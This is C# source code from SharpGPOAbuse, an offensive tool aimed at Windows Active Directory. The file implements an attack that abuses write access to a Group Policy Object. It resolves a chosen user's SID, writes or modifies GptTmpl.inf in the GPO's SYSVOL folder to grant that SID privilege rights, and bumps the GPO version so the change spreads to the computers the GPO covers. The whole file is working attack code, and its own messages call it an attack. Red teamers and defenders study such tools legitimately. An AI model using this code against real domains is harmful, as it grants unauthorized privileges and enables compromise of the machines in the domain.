using System;
using System.IO;
using System.DirectoryServices.AccountManagement;

namespace SharpGPOAbuse
{
    public class UserRightAssignment
    {
        public static void AddNewRights(string Domain, string DomainController, string GPOName, string DistinguishedName, string[] NewRights, string UserAccount)
        {
            // Get SID of user who will be local admin
            PrincipalContext ctx = new PrincipalContext(ContextType.Domain, DomainController);
            UserPrincipal usr = null;
            try
            {
                usr = UserPrincipal.FindByIdentity(ctx, IdentityType.SamAccountName, UserAccount);
                Console.WriteLine("[+] SID Value of " + UserAccount + " = " + usr.Sid.Value);
            }
            catch
            {
                Console.Error.WriteLine($"[!] Could not find user {UserAccount} in the {Domain} domain.");
                return;
            }

            string GPOGuid = GroupPolicy.GetGPOGUID(DomainController, GPOName, DistinguishedName);

            string text = @"[Unicode]
Unicode=yes
[Version]
signature=""$CHICAGO$""
Revision = 1
[Privilege Rights]";

            string right_lines = null;
            foreach (string right in NewRights)
            {
                text += Environment.NewLine + right + " = *" + usr.Sid.Value;
                right_lines += right + " = *" + usr.Sid.Value + Environment.NewLine;
            }

            string path = $@"\\{Domain}\\SysVol\\{Domain}\\Policies\\{GPOGuid}";
            string GPT_path = path + "\\GPT.ini";

            // Check if GPO path exists
            if (Directory.Exists(path))
            {
                path += "\\Machine\\Microsoft\\Windows NT\\SecEdit\\";
            }
            else
            {
                Console.Error.WriteLine("[!] Could not find the specified GPO.");
                return;
            }

            // check if the folder structure for adding admin user exists in SYSVOL
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            path += "GptTmpl.inf";
            if (File.Exists(path))
            {
                bool exists = false;
                Console.WriteLine("[+] File exists: " + path);
                string[] readText = File.ReadAllLines(path);

                foreach (string s in readText)
                {
                    // Check if memberships are defined via group policy
                    if (s.Contains("[Privilege Rights]"))
                    {
                        exists = true;
                    }
                }

                // if user rights are defined
                if (exists)
                {
                    // Curently there is no support for appending user rights to exisitng ones
                    Console.Error.WriteLine("[!] The GPO already specifies user rights. Select a different attack.");
                    return;
                }

                // if user rights are not defined
                if (!exists)
                {
                    Console.WriteLine("[+] The GPO does not specify any user rights. Adding new rights...");
                    using (StreamWriter file2 = new StreamWriter(path))
                    {
                        foreach (string l in readText)
                        {
                            file2.WriteLine(l);
                        }
                        file2.WriteLine("[Privilege Rights]" + Environment.NewLine + right_lines);
                    }
                    GroupPolicy.UpdateVersion(Domain, DistinguishedName, GPOName, GPT_path, "AddNewRights", "Computer");
                }
            }
            else
            {
                Console.WriteLine("[+] Creating file " + path);
                File.WriteAllText(path, text);
                GroupPolicy.UpdateVersion(Domain, DistinguishedName, GPOName, GPT_path, "AddNewRights", "Computer");
            }
        }
    }
}